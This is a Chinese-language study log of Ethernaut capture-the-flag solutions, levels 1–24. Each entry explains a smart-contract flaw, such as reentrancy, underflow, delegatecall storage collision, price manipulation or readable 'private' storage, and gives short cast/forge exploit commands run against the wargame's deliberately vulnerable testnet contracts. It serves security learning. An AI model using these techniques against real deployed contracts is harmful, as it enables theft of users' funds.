---
timezone: Asia/Taipei
---

# DeletedAccount

1. 自我介绍

- [DeletedAccount](https://www.linkedin.com/in/howpwn/), A Security Engineer.

2. 你认为你会完成本次残酷学习吗？

- 本次報名主要目的是為了加深自己對 EVM 的理解，並非為了爭奪獎金或培養 CTF 選手。
- 有 40% 的信心可以順利按表操課...不過即使每日打卡失敗，也會盡量繼續完成 21 天挑戰，為自己而學！


## Notes

<!-- Content_START -->

### 2024.08.29

- Day1 共學開始
- 有一段時間沒寫 Solidity 了，順便趁此次機會順便複習過去看過但印象不深的挑戰。
- 並且寫下自己的解題思路，供未來可以回頭參考。
- 志不在競爭激勵金，不限制自己的題數與系列。
- 時間內能刷多少題就盡量刷，目標希望可以刷完全部題目。


#### [Ethernaut-01] Fallback

- 破關條件: 把 `Fallback.owner` 改成自己，並且把 `Fallback.balance` 歸零
  - 看起來至少要呼叫到 `contribute()` 或 `receive()` 才能改動 `owner`
    - `receive()` 有限制 `contributions[msg.sender] > 0`，不能直接呼叫，看起來只能從 `contribute()` 開始下手
  - 解法:
    - 先調用 `contribute()` 帶一點 ETH, 讓自己的 `contributions` 不為 0
    - if 判斷沒過可以不用管它
    - 然後再調用 `receive()` 就可以把 `owner` 改成自己了
- 知識點: fallback function 可以直接透過 send native coin 觸發

解法:

- [Ethernaut01-Fallback.sh](/Writeup/DeletedAccount/Ethernaut01-Fallback.sh)

```bash=
cast send -r $RPC_OP_SEPOLIA $FALLBACK_INSTANCE "contribute()" --value 1wei --private-key $PRIV_KEY
cast send -r $RPC_OP_SEPOLIA $FALLBACK_INSTANCE --value 1wei --private-key $PRIV_KEY
cast send -r $RPC_OP_SEPOLIA $FALLBACK_INSTANCE "withdraw()" --private-key $PRIV_KEY
```

#### [Ethernaut-02] Fallout

- 破關條件: 把 `Fallout.owner` 改成自己
- 解法: 直接呼叫 `Fal1out()` 函數就過了
- 知識點: 在舊版 solidity 中 (`<0.5.0`)，函數名稱等於合約名稱的函數會被當成 constructor 使用

解法:

- [Ethernaut02-Fallout.sh](/Writeup/DeletedAccount/Ethernaut02-Fallout.sh)


```bash=
cast send -r $RPC_OP_SEPOLIA $FALLOUT_INSTANCE "Fal1out()" --private-key $PRIV_KEY
```

#### [Ethernaut-03] Coin Flip

- 破關條件: `CoinFlip.flip(bool)` 猜中 10 次就過關
- 解法: 只需要預先算出 `side` 是 True 或 False 就好
  - 由於題目不要求一定要本輪答案一定正面或反面，只需要猜測現在是正面還是反面
  - 也不需要答題者一定要是某個特定的錢包地址
  - 所以我們可以直接寫一個 Contract，複製 CoinFlip 的算法，得知本輪答案會是正面或反面，然後再幫忙送出答案就好
- 知識點: 不要用鏈上原生資訊產生隨機數，因為這可以透過鏈下預測/鏈上預算出來

解法:

- [Ethernaut03-CoinFlip.sh](/Writeup/DeletedAccount/Ethernaut03-CoinFlip.sh)
- [Ethernaut03-CoinFlip.s.sol](/Writeup/DeletedAccount/Ethernaut03-CoinFlip.s.sol)

```bash=
bash Ethernaut03-CoinFlip.sh
```

#### [Ethernaut-04] Telephone

- 破關條件: 把 `Telephone.owner` 改成自己
- 解法: 寫一個 Contract 去呼叫 `changeOwner()` 來繞過 `tx.origin` 的檢查
- 知識點: tx.origin 和 msg.sender 的差別

解法:

- [Ethernaut04-Telephone.s.sol](/Writeup/DeletedAccount/Ethernaut04-Telephone.s.sol)

```bash=
forge script Ethernaut04-Telephone.s.sol:Solver -f $RPC_OP_SEPOLIA --broadcast
```

#### [Ethernaut-05] Token

- 破關條件: 一開始會發 20 個 token 給我，讓自己的 token 數量變超多就過關
- 解法:
  - 關鍵點在 `require(balances[msg.sender] - _value >= 0);`
  - 在 Solidity 0.8 以前，沒有內建的 Integer Overflow/Underflow 保護
  - 所以我們可以使 `_value` 下溢到 `uin256.max-1`，來通過這個 `require()` 檢查
  - 將 `_value` 設置為 21 即可觸發下溢
- 知識點: Solidity 0.8 以前，沒有內建的 Integer Overflow/Underflow 保護

解法:

- [Ethernaut05-Token.sh](/Writeup/DeletedAccount/Ethernaut05-Token.sh)

```bash=
cast call -r $RPC_OP_SEPOLIA $TOKEN_INSTANCE "balanceOf(address)" $MY_EOA_WALLET | cast to-dec # check: 20
cast send -r $RPC_OP_SEPOLIA $TOKEN_INSTANCE "transfer(address,uint256)" 0x0000000000000000000000000000000000001337 $MY_EOA_WALLET --private-key $PRIV_KEY
cast call -r $RPC_OP_SEPOLIA $TOKEN_INSTANCE "balanceOf(address)" $MY_EOA_WALLET | cast to-dec # check: large number
```

#### [Ethernaut-06] Delegation

- 破關條件: 把 `Delegation.owner` 改成自己
- 解法:
  - 乍看之下 Delegation 合約中，似乎沒有任何代碼可以更改 `Delegation.owner`
  - 但由於 Delegation 合約會透過 **delegatecall** 呼叫 `Delegate` 合約
  - `Delegate` 合約中, 有邏輯代碼 `pwn()` 可以使 `Delegation.owner` 被更改掉
  - **因為 `Delegation` 透過 delegatecall 借用 `Delegate` 邏輯代碼，且兩邊的 `owner` 變數都是佔用著 slot0**
- 知識點: 使用 ProxyPattern 的合約，Storage 會用 Proxy 合約的佈局，但邏輯代碼會運行 Logic 合約的代碼

解法:

- [Ethernaut05-Delegation.sh](/Writeup/DeletedAccount/Ethernaut06-Delegation.sh)

```bash=
cast send -r $RPC_OP_SEPOLIA $DELEGATION_INSTANCE "pwn()" --private-key $PRIV_KEY
```

#### [Ethernaut-07] Force

- 破關條件: 把 `Force` 的以太幣餘額改成不為 0
- 解法:
  - 乍看之下 Force 合約中沒有實現 `receive()` 或 `fallback()` 函數，無法接收以太幣
  - 但我們可以透過 `selfdestruct()` 強制發送以太幣過去
- 知識點: 使用 `selfdestruct()` 可以將合約解構掉，並且將剩餘的以太強制地轉移到指定地址，不論該地址是否有實現 `receive()` 或 `fallback()` 函數
- 知識點2: 在 Dencun 升級後引入了 [EIP-6780](https://eips.ethereum.org/EIPS/eip-6780)
  - 現在除非 selfdestruct 在同一個交易中觸發，否則不會解構合約，只會強制轉移剩餘的全部以太幣

解法:

- [Ethernaut07-Force.sh](/Writeup/DeletedAccount/Ethernaut07-Force.sh)
- [Ethernaut07-Force.s.sol](/Writeup/DeletedAccount/Ethernaut07-Force.s.sol)

```bash=
cast balance $FORCE_INSTANCE -r $RPC_OP_SEPOLIA
forge script script/Ethernaut07-Force.s.sol:Solver -f $RPC_OP_SEPOLIA --broadcast
cast balance $FORCE_INSTANCE -r $RPC_OP_SEPOLIA
```

#### [Ethernaut-08] Vault

- 破關條件: 使 `locked = false`
- 解法:
  - 讀取 `slot1` 得知密碼
  - 再呼叫 `unlock()` 來解鎖即可
- 知識點: 不要在鏈上存任何 secret，因為所有人都看得到 Storage

解法:

- [Ethernaut08-Vault.sh](/Writeup/DeletedAccount/Ethernaut08-Vault.sh)

```bash=
THE_PASSWORD=`cast storage "$VAULT_INSTANCE" 1 -r "$RPC_OP_SEPOLIA"
cast send -r $RPC_OP_SEPOLIA $VAULT_INSTANCE "unlock(bytes32)" $THE_PASSWORD --private-key $PRIV_KEY
```

#### [Ethernaut-09] King

- 破關條件: 這是一個 King-of-Hill 類型的遊戲，需要我們把遊戲機制搞爛才能過關。
  - 在 Submit 的時候，`owner` 會透過 `receive()` 函數重新拿回 `king` 王位
  - 我們需要讓 `owner` 無法拿回王位，才能過關。
- 解法:
  - 在關卡開始的時候, `prize = 0.001 ether`
  - 我們的重點需要讓 `payable(king).transfer(msg.value);` 執行失敗，這樣就沒人可以拿回王位了
  - 如果一個合約地址沒有實現 `receive()` 函數，那麼執行 `transfer()` 將會觸發 revert
  - 所以我們只需要寫一個合約，裡面沒有實現 `receive()` 函數，並且向 King 合約發送 0.001 讓合約成為 `king`
  - 這樣一來，`owner` 就無法 reclaim 王位了
- 知識點: 發送 Ether 的三種不同的作法: `transfer()`, `send()` 與 `call()` 的差別

複習: `fallback()` 和 `receive()` 的使用場景差別
![fallback_vs_receive](/Writeup/DeletedAccount/fallback_VS_receive.png)

複習:`transfer()`, `send()` 與 `call()` 的差別

|            	| gas                    	  | return value  | use-case                               |
|------------	|-------------------------- |--------------	|--------------------------------------- |
| transfer() 	| 2300                   	  | revert()      | 純轉帳，因為 2300 gas 沒辦法做複雜操作 	    |
| send()     	| 2300                   	  | False 	      | 純轉帳，因為 2300 gas 沒辦法做複雜操作      |
| call()     	| Maximum gasLeft() * 63/64 | False 	      | 複雜操作，但需要添加重入保護                |


- 如果你開發的智能合約有使用 `transfer()`，請最好確保 `transfer()` 的對象永遠是一個可受信任的白名單地址
- 否則有可能會發生如本題所示的 DoS 攻擊。

解法:

- [Ethernaut09-King.sh](/Writeup/DeletedAccount/Ethernaut09-King.sh)
- [Ethernaut09-King.s.sol](/Writeup/DeletedAccount/Ethernaut09-King.s.sol)

```bash=
forge script script/Ethernaut09-King.s.sol:Solver --broadcast -f $RPC_OP_SEPOLIA
```

#### [Ethernaut-10] Re-entrancy

- 破關條件: 把 `Reentrance` 合約內的資金榨乾
- 解法:
  - 題目都叫 Re-entrancy 了，那肯定是考重入攻擊的利用方式
  - 題目是 0.8 以下的版本，但是有 `using SafeMatch` 來保護 balances，所以溢出是不可行的
  - 我們用 `cast balance $REENTRANCY_INSTANCE -r $RPC_OP_SEPOLIA -e` 可以觀察到 `Reentrance` 有 0.001 ether，我們的目標是把它偷出來
  - 寫一個合約，合約先調用 `donate()` 使自己的 `balances[]` 有紀錄
  - 然後呼叫 `withdraw()` 把剛剛的 donate 拿出來
  - 因為 `Reentrance` 合約用的是 `call()` 而且沒有限制 GasLimit
  - 也沒有對 `withdraw()` 函數做任何重入保護
  - 所以我們寫的合約需要寫一個 `receive()` 邏輯，重複地去呼叫 `withdraw()` 直到合約餘額歸零
- 知識點: 重入攻擊的利用手法，以及如何保護它

解法:

- [Ethernaut10-Reentrancy.sh](/Writeup/DeletedAccount/Ethernaut10-Reentrancy.sh)
- [Ethernaut10-Reentrancy.s.sol](/Writeup/DeletedAccount/Ethernaut10-Reentrancy.s.sol)

```bash=
forge script script/Ethernaut10-Reentrancy.s.sol:Solver --broadcast -f $RPC_OP_SEPOLIA
```

#### [Ethernaut-11] Elevator

- 破關條件: `Elevator.top` 的預設值是 `false`，要把它變成 `true`
- 解法:
  - 首先我們可以觀察到 `building` 是可控的。我們可以自行決定如何實現 `Building` 合約
  - 觀察 `goTo()` 可以發現 `building.isLastFloor(_floor)` 似乎不可能同時在一筆交易中既返回 False 又返回 True
  - 但由於 `isLastFloor()` 沒有限制一定要是 `view` 或 `pure` 函數，所以我們可以自己來實現 `isLastFloor()` 的邏輯
  - 我們只需要寫一個簡單的 toggle，讓第一次呼叫 `isLastFloor()` 的時候返回 False，第二次返回 `True` 就可過關了
  - 我的解法是透過 `called_count % 2 == 1` 來判斷是否為第一次呼叫還是第二次呼叫
    - `第一次呼叫 == 1` 單數呼叫次數，返回 False，使 `goTo()` 的 if 條件通過
    - `第二次呼叫 == 0` 偶數呼叫次數，返回 True 使 `top` 為 True
- 知識點: 開發合約應該 Zero-Trust。如果交互地址是由使用者可控，不要相信對方會按照你所想的方式實施合約邏輯

解法:

- [Ethernaut11-Elevator.sh](/Writeup/DeletedAccount/Ethernaut11-Elevator.sh)
- [Ethernaut11-Elevator.s.sol](/Writeup/DeletedAccount/Ethernaut11-Elevator.s.sol)

```bash=
forge script script/Ethernaut11-Elevator.s.sol:Solver --broadcast -f $RPC_OP_SEPOLIA
```

#### [Ethernaut-12] Privacy

- 破關條件: 知道 `bytes16(data[2])` 是多少，來使得 `locked = false`
- 解法:
    - 這題和 [Ethernaut-08] Vault 一樣都是考怎麼查看 Storage，只是這題更注重 Storage Layout 的解讀
    - `bool` 會自己佔掉一個 32 bytes 的 slot
    - `uint8` 和 `uint16` 會共用同一個 slot，因為他們個別來看都不滿足 32 bytes 大小
    - `bytes32[3]` 由於是 Static Array，所以會直接佔用掉 3 個 Slot，不需要考慮 Array Length 和 Offset
    - 所以 `_key` 的答案會出現在 slot5，但要記得取前半段的 16 bytes
- 知識點: Storage Layout and Storage Packed

解法:

- [Ethernaut12-Privacy.sh](/Writeup/DeletedAccount/Ethernaut12-Privacy.sh)

```bash=
key=$(cast storage $PRIVACY_INSTANCE 5 -r $RPC_OP_SEPOLIA | cut -c1-34) # 取出 bytes16 需要取前 34 個字串，因為輸出含前綴 0x
cast send -r $RPC_OP_SEPOLIA $PRIVACY_INSTANCE "unlock(bytes16)" 0x300fbf4b66e2c895415881cde0d9fbb2 --private-key $PRIV_KEY
```

#### [Ethernaut-13] Gatekeeper One

- 破關條件: 使 `enter()` 呼叫成功，需要通過三道 modifier 的試煉
- 解法:
  - `gateOne()` 要求呼叫者必須是合約
  - `gateTwo()` 要求 gas left 剛好可以被 8191 整除
    - 所以呼叫 `enter()` 的所需 Gas 數量必須是在執行完 `gateOne()` 進入到 `gateTwo()` 的時候，剛好可以被 8191 整除
    - 這意味著我們要馬必須知道在這之前會消耗多少 gas，不然就是得透過暴力破解，來得到**離能夠被 8192 整除還需要多少 gas**
    - 我偏好使用爆破的方式來解決
  - `gateThree()` 要滿足一系列的條件，這個可以用 chisel 動手算一遍就可以算的出來正確的 `_gateKey`
    - 這邊的重點在於，當一個大類型的數字透過 casting 轉換成小類型的數字，高位的 bytes 會被捨棄，僅保留低位的 bytes
      - 範例:
      - uint64(bytes8(0x300fbf4b66e2c895)) -> 0x300fbf4b66e2c895
      - uint32(uint64(bytes8(0x300fbf4b66e2c895))) -> 0x66e2c895
    - 要滿足第一個條件 `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` 可以發現 uint32 要相等於 uint16
      - 唯一的辦法就是 uint32 的高位 2 個 bytes 都是 0
      - 所以現在可以確定 `_gateKey` 是 `0x????????0000????`
    - 當第一個條件滿足了，通常第二個條件也會跟著一起滿足了，因為不太可能拿到剛好算出來是 0000 的 EOA 地址
    - 從第三個條件可以看出來 `_gateKey` 是 `0x????????0000nnnn` n 為錢包地址末 4 碼
    - 所以我們可以直接用遮罩 `0xffffffff0000nnnn` 算出來 `_gateKey`


- 知識點: Casting 從大轉換成小，高位元會被 Drop 掉，以及知道怎麼操縱 `gasLeft＃()`

解法:

- [Ethernaut13-GatekeeperOne.sh](/Writeup/DeletedAccount/Ethernaut13-GatekeeperOne.sh)
- [Ethernaut13-GatekeeperOne.s.sol](/Writeup/DeletedAccount/Ethernaut13-GatekeeperOne.s.sol)


#### [Ethernaut-14] Gatekeeper Two

- 破關條件: 使 `enter()` 呼叫成功，需要通過三道 modifier 的試煉 (老實說我感覺比 One 簡單 😂)
- 解法:
  - `gateOne()` 要求呼叫者必須是合約
  - `gateTwo()` 要求我們的合約不能夠有 code size, 這意味著我們必須在 constructor 內完成解答
  - `gateThree()` 要求合約的地址經過 keccak256 和 casting 之後，和 `gateKey` 做 XOR 後要得到 0xffffffffffffffff
    - 這意味著我們不能像 One 一樣可以在鏈下預先計算出 `gateKey` 是多少了
    - 但這題簡單的地方在於，要得到 `gateKey` 我們只需要將 合約的地址經過 keccak256 和 casting 之後，直接和 0xffffffffffffffff 做 XOR 就可以得到 `pathKey` 了
    - xor.pw 這邊可以自己實驗看看
      - 輸入 `abcd` 和 `ffff` 會得到 `5432`
      - 輸入 `abcd` 和 `5432` 會得到 `ffff`

- 知識點: 如何隱藏 code size 以及 XOR 算法

解法:

- [Ethernaut14-GatekeeperTwo.sh](/Writeup/DeletedAccount/Ethernaut13-GatekeeperTwo.sh)
- [Ethernaut14-GatekeeperTwo.s.sol](/Writeup/DeletedAccount/Ethernaut13-GatekeeperTwo.s.sol)

#### [Ethernaut-15] Naught Coin

- 破關條件: 關卡建立後，會自動給我們 1000000 顆 Naught Coin，我們要把它轉走，使自己的 token balance 歸零
- 解法:
  - 可以看到 `lockTokens()` 限制了我們對 `.transfer()` 方法的呼叫
  - 這意味著我們勢必要走另一條路
  - 從 [ERC20.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol) 可以觀察到，除了透過 `transfer()` 來轉移代幣以外，還可以透過 `transferFrom()` 來轉移
  - 所以我們可以 approve 轉帳權給我們自已建立的合約
  - 再透過合約呼叫 `transferFrom()` 把我們的代幣餘額歸零
- 知識點: 除了 `transfer()` 以外，還可以利用 `approve()` + `transferFrom()` 把 token balance 轉走

解法:

- [Ethernaut15-NaughtCoin.sh](/Writeup/DeletedAccount/Ethernaut15-NaughtCoin.sh)
- [Ethernaut15-NaughtCoin.s.sol](/Writeup/DeletedAccount/Ethernaut15-NaughtCoin.s.sol)

### 2024.08.30

- Day2 共學開始
- 目前規劃會在本檔案做流水帳紀錄
- 預計會在 9/20 來做一個 Writeup 總整理
- 放假日有空也會回來整理

#### [Ethernaut-16] Preservation

- 破關條件: 把 `owner` 權限改成自己
- 解法:
  - 這題和第六關 Delegation 很像
  - 我應該要先呼叫一次 `setFirstTime()`，`_timeStamp` 改成自己部署合約的地址
    - 這樣應該就可以蓋掉 `Preservation.timeZone1Library` 成為自己
  - 然後再次呼叫 `setFirstTime()` 使 `Preservation` Delegatecall 到自己的合約
  - 然後自己的合約再把 slot2 改成 `tx.origin`，這樣就可以過關了
- 知識點: Storage Collision、Function Signature

解法:

- [Ethernaut16-Preservation.sh](/Writeup/DeletedAccount/Ethernaut16-Preservation.sh)
- [Ethernaut16-Preservation.s.sol](/Writeup/DeletedAccount/Ethernaut16-Preservation.s.sol)

#### [Ethernaut-17] Recovery

- 破關條件: 呼叫 `SimpleToken.destroy()` 使它的以太幣餘額清空，但你要想辦法找出 `SimpleToken` 的合約地址 
- 解法:
  - 呃...直接去 Explorer 看，就能知道 0.001 ETH 跑到哪裡去了XD
  - ![etherscan](/Writeup/DeletedAccount/Ethernaut17-Recovery.png)
  - 但這其實算偷吃步，因為如果遇到像 Paradigm CTF 這種會自架區塊鏈的題目，這招就沒辦法使用了
  - 所以重點還是要知道 `new` 出來的合約地址究竟是如何被計算出來的
  - 公式是: `new_contract_address = hash(msg.sender, nonce)`
  - 可以用 `cast nonce $RECOVERY_INSTANCE -r $RPC_OP_SEPOLIA` 查到目前 Instance 有多少 Nonce
  - Nonce 是 2，代表它已經發過 2 次 Transaction (即: 下一筆交易會是用 Nonce 3)
  - 我們算 1 和 2 就可以知道計算結果的其中一個是 `SimpleToken` 的地址了
  - 如果目標的 Nonce 很大，解法中的 Python Script 可以加個迴圈和判斷式，快速爆破
- 知識點: `new` 出來的地址，是可以被預先算出並得知的

解法:

- [Ethernaut17-Recovery.sh](/Writeup/DeletedAccount/Ethernaut17-Recovery.sh)
- [Ethernaut17-Recovery.py](/Writeup/DeletedAccount/Ethernaut17-Recovery.py)

#### [Ethernaut-18] Magic Number

- 破關條件: 部署一個呼叫了會返回 `42` 的合約，但是該合約的 runtime bytecode 必須少於 10 bytes
- 解法:
  - 照著 evm.codes 操作即可，似乎沒什麼好講的
  - 這題不難，只是有點麻煩而已
  - 之前是用 Yul 解這題，這次換用 Huff 來解
  - 因為不熟悉 creation bytecode 和 runtime bytecode 的差別，過程踩了蠻多的坑
    - 主要是卡在用 `-b` 會包含 creation bytecode, 要檢查長度是否少於 10 bytes 還是要用 `-r` 來檢查 runtime bytecode...
  - 用 evm.codes 解很快，但不熟悉 Huff 的語法，花了一些時間看官方文件
- 知識點: EVM OP Codes

解法:

- [Ethernaut18-MagicNumber.sh](/Writeup/DeletedAccount/Ethernaut18-MagicNumber.sh)
- [Ethernaut18-MagicNumber.huff](/Writeup/DeletedAccount/Ethernaut18-MagicNumber.huff)

### 2024.08.31

- Day3 共學開始
- 祖父送急診...本日大部分時間都在照顧老人
- 學習時間不多，今天進度較少

#### [Ethernaut-19] Alien Codex

個人覺得這一題十分有趣，屬於必看必解題！

- 破關條件: 把 `owner` 變成自己
- 解法:
  - 題目本身沒宣告 `owner`，但可以觀察到 `AlienCodex` 有繼承 Ownable
  - `Ownable-05.sol"` 的原始碼沒給，但我們可以從 [GitHub](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol#L13) 找到原始碼觀察到 `address private _owner`
  - 繼承的合約 `Ownable` 所宣告變數，會先佔用 Storage，所以 `_owenr` 的 Slot 是在 Slot0
  - 並且編譯都是用 Solidity 0.5.0，沒有內建 overflow/underflow 的版本，所以猜測可能是與 overflow/underflow 有關的漏洞利用
  - 這一題的主要考點是 Array Overflow/Underflow，需要知道一個 Dynamic Array 宣告在 Storage 的時候，具體來說其中的 Elements 都會被放在哪個 Slot
  - `codex` 這個 Dynamic Bytes32 Array 被宣告在 Slot1，因為 `contact` 會和 `_owner` 打包在一起 (`concat` 在左邊高位 `_owner`在右邊低位)
    - **Slot2 本身**將會放的是這個 **Dynamic Array 目前的總長度**
    - Dynamic Array 的**第一個元素**會被放在 **`keccak256(n) + 0`**，n 等於原先佔用的 slot offset (本例 `codex` 佔用 Slot2，即 `n=1`)
    - Dynamic Array 的**第二個元素**會被放在 **`keccak256(n) + 1`**
    - Dynamic Array 的**第三個元素**會被放在 **`keccak256(n) + 2`**，依此類推
  - 我們的目標是控制 Slot0 的內容，乍看之下似乎無路可解
  - 但我們有 `retract()` 可以將 Slot1 的值，從 `keccak256(0)` (即 `codex` 元素有 `0` 個) 更改為 `keecak256(2**256 - 1)` (即 `codex` 元素有 `2**256 - 1` 個)
  - 欸！既然 `codex` 的 index 長度可以拉到 `2**256-1` 個，那是不是代表...
  - 沒錯！我們可以利用 `revise()` 函數來達到 **任意重設指定的 Storage Slot 的內容值** 了！
  - 為了過關，我們肯定是想要將 Slot0 的前 20 bytes 內容值修改成自己的地址的，但具體來說如何做呢？
    - 我們需要將 `codex` 佔用的首個元素的 Slot Number，再加上某個偏移量造成 Overflow，使它能夠重新指向到 Slot0
    - 假設上述輸出命名為 i，則 i 的計算公式為:
    - `i = keccak256(1) + N = 0x0000...0000`
    - 要取得 N，我們只需要將 `0xffff...ffff` 減去 `keccak256(1)` 再 `+1` 即可
    - `N = (0xffff...ffff - keccak256(1)) + 1`

```soldity
bytes32 slot_index_of_first_element_of_codex = keccak256(abi.encode(uint256(1)));
bytes32 max_bytes32 = bytes32(type(uint256).max);
bytes32 array_index_that_occupied_the_slotMAX = bytes32(uint256(max_bytes32) - uint256(slot_index_of_first_element_of_codex));
bytes32 N = bytes32(uint256(array_index_that_occupied_the_slotMAX) + 1)
```
- 知識點: Array Storage Layout, Array Underflow/Overflow


解法:

- [Ethernaut19-AlienCodex.sh](/Writeup/DeletedAccount/Ethernaut19-AlienCodex.sh)
- [Ethernaut19-AlienCodex.s.sol](/Writeup/DeletedAccount/Ethernaut19-AlienCodex.s.sol)

### 2024.09.02

- Day4 共學開始

#### [Ethernaut-20] Denial

- 破關條件: 在 `Denial` 合約仍有足夠以太幣的前提下，使其他人調用 `withdraw()` 失敗
- 解法:
  - 先調用 `setWithdrawPartner()` 使自己部署的攻擊合約成為 partner
  - 在攻擊合約的 `receive()` 或 `fallback()` 函數寫一些會 Out-of-Gas 的邏輯即可
  - 例如: 無窮迴圈
- 知識點: Out-of-Gas DoS Attack

解法:

- [Ethernaut20-Denial.sh](/Writeup/DeletedAccount/Ethernaut20-Denial.sh)
- [Ethernaut20-Denial.s.sol](/Writeup/DeletedAccount/Ethernaut20-Denial.s.sol)


#### [Ethernaut-21] Shop

- 破關條件: 把 `price` 拉到 `100` 以下
- 解法:
  - 使第一次呼叫 `_buyer.price()` 時，返回 `101` 來通過 if 敘述
  - 然後再使第二次呼叫 `_buyer.price()` 時，返回 `99` 來達成過關條件
  - 這邊沒辦法像之前一樣都用 called_count 來紀錄呼叫次數，因為 `price()` 必須是一個 view 函數
  - 但我們可以利用 `Shop.isSold` 來知道這是第一次呼叫還是第二次呼叫
- 知識點: Restriction of the view function, contract interface

解法:

- [Ethernaut21-Shop.sh](/Writeup/DeletedAccount/Ethernaut21-Shop.sh)
- [Ethernaut21-Shop.s.sol](/Writeup/DeletedAccount/Ethernaut21-Shop.s.sol)



#### [Ethernaut-22] Dex

- 破關條件: 利用價格操縱漏洞，竊取 `Dex` 合約的資金，使其中一個 Token 的餘額歸零
- 解法:
  - 這一題的考點主要是 `X * Y = K` 恆定乘積做市商算法的漏洞
  - 如果 swapAmount 等於 `amount * Y / X` 且沒有進行 K 值的檢查，將會導致 `swapAmount` 在幾次來回交換後，因為 `X` 值變小而使換出的 Y token 數量變多
  - 當 DEX 不依靠去中心化價格預言機或時間加權機制，僅透過 Reserve 來實施價格發現，就會受到價格操縱攻擊
  - 我們只需要反覆地將 token1 換到 token2，token2 再換回 token1，來回操作幾遍就會發現每次換出來的金額都會越來越大
  - 建議自己拿算盤驗算看看 `getSwapPrice()` 函數的返回值
- 知識點: 不安全的價格資訊參考

- [Ethernaut22-Dex.sh](/Writeup/DeletedAccount/Ethernaut22-Dex.sh)
- [Ethernaut22-Dex.s.sol](/Writeup/DeletedAccount/Ethernaut22-Dex.s.sol)


### 2024.09.03

- Day5 共學開始

#### [Ethernaut-23] Dex Two

- 破關條件: 與 `Dex` 不同，這次要求把 `DexTwo` 的兩個 Token 餘額都歸零
- 解法:
  - `Dex` 和 `DexTwo` 很像，所以我們可以直接 Diff 看看兩者的差別
  - ![DexTwo](/Writeup/DeletedAccount/Ethernaut23-DexTwo.png)
  - 從上圖可以很明顯地發現到，`swap()` 函數的 `require()` 要求不見了
  - 這意味著我們可以給定任意的 ERC20 代幣來進行 `swap()` 的動作
    - 只要我們部署的 ERC20 合約具有 `transferFrom()` 和 `balanceOf()` 方法即可
  - 具體上來說，一開始 `DexTwo` 合約會有各 100 個 token, 我們有各 10 個 token
  - 要將 DexTwo 的 token1 取出來，我們要先發 100 顆 PhonyToken 給 `DexTwo`
  - 這樣才能使得調用 `swap(from=PhonyToken, to=token1, amount=100)` 可以把 DexTwo 的 token1 全部換走
  - 接下來再把 DexTwo 的 token2 取出來。
  - 經過上一輪 `swap()`，DexTwo 已經有了 100 顆 PhonyToken
  - 所以要馬我們再生成一個 PhoneyToken2，用上面的方式一樣把 token2 全部換走
  - 要馬就是我們用 200 顆 PhoneyToken 把  token2 取走

- 知識點: Arbitrary Input Vulnerability

解法:

- [Ethernaut23-DexTwo.sh](/Writeup/DeletedAccount/Ethernaut23-DexTwo.sh)
- [Ethernaut23-DexTwo.s.sol](/Writeup/DeletedAccount/Ethernaut23-DexTwo.s.sol)


### 2024.09.05

- 09.04 身體不舒服，請假一天
- Day6 共學開始

#### [Ethernaut-24] Puzzle Wallet

個人覺得這一題十分有趣，屬於必看必解題！

- 破關條件: 把 `PuzzleProxy` 的 `admin` 變成自己
- 解法:
  - 可以看到 `PuzzleProxy` 是一個 UpgradeableProxy，Logic 合約是 `PuzzleWallet`
  - 當涉及到 Proxy 的時候，通常都會去檢查 Storage Layout
  - 可以發現到 `PuzzleProxy.pendingAdmin` 對應的是 `PuzzleWallet.owner`
  - 可以發現到 `PuzzleProxy.admin` 對應的是 `PuzzleWallet.maxBalance`
  - 這意味著我們必須要能在 `PuzzleWallet` 找到地方可以操縱 `PuzzleWallet.maxBalance`，使它的數值變成我們的錢包地址
  - `PuzzleWallet.maxBalance` 可以在 `PuzzleWallet.init()` 函數與 `PuzzleWallet.setMaxBalance()` 函數進行更改
  - `PuzzleWallet.init()` 這一條路應該是沒辦法走的，因為 `PuzzleWallet.maxBalance` 的值已經是設置成 `PuzzleWallet.admin` 了
  - 我們只能嘗試走 `PuzzleWallet.setMaxBalance()` 這條路，但這要求我們要是 whitelisted 以及 `address(this).balance` 為 0
  - 要怎麼成為 whitelisted 呢? 我們必須要使 `msg.sender == owner` 
  - `PuzzleWallet.owner` 被宣告在 slot0，也就是與 `PuzzleProxy.pendingAdmin` 對應
  - `PuzzleProxy.pendingAdmin` 可以透過 `PuzzleProxy.proposeNewAdmin()` 進行修改
  - 總結目前發現：我們可以透過 `PuzzleProxy.proposeNewAdmin()` 函數的調用，使 `PuzzleWallet.owner` 被修改，進而使我們成為 `whitelisted`
  - `onlyWhitelisted` 的問題解決掉了，下一步是找到方式讓 `address(this).balance == 0` 條件敘述通過
  - 透過 `cast balance -r $RPC_OP_SEPOLIA $PUZZLEWALLET_INSTANCE` 指令，可以得知 `PuzzleProxy` 合約有 0.001 顆 ETH
  - 從題目給出的代碼來看，也似乎只有 `execute()` 函數可以把 ETH 提領出來，所以這應該會是我們要嘗試的漏洞利用路徑
  - `execute()` 函數要求我們必須使 `balances[msg.sender]` 大於欲提領的數量，意味著我們必須先使自己的 `balances[msg.sender]` 增加至 0.001 ETH
  - 要增加 `balances[msg.sender]` 必須透過 `deposit()` 函數
  - 由於 `PuzzleWallet.maxBalance` 等同於 `PuzzleProxy.admin`，所以 `address(this).balance <= maxBalance` 的條件敘述基本上不會正常工作
  - 但問題在於: 我們 `deposit()` 存入 0.001 顆 ETH，也只能 `execute()` 提領出來 0.001 顆 ETH
  - 似乎怎麼操作都會使 `PuzzleProxy` 的餘額仍然剩餘 0.001 ETH，如何繞過呢？我們可以利用 `multicall()` 函數裡的 `deletecall()`！
  - 我們需要建構出一條 deletegatecall 鏈
    - 首先 `PuzzleProxy` 會 delegatecall `PuzzleWallet` 的函數
    - 我們指定 delegatecall `PuzzleWallet.multicall()`
    - 在 `multicall()` 裡面，我們利用 `multicall()` 裡面的 delegatecall 來呼叫 `deposit()` 函數
    - 呼叫 `deposit()` 的時候，要帶入 0.001 ETH 進去
      - 此時 msg.sender 是我們的錢包
      - 此時 msg.value 等於 0.001 ETH
    - 我們透過第二組 `data` 再次呼叫 `multicall()`
    - 第二組的 `multicall()` 再次呼叫 `deposit()`
      - 此時 msg.sender 依舊是我們的錢包
      - 此時 msg.value 依舊等於 0.001 ETH **(但是我們並沒有因此多提供了 0.001 ETH)**
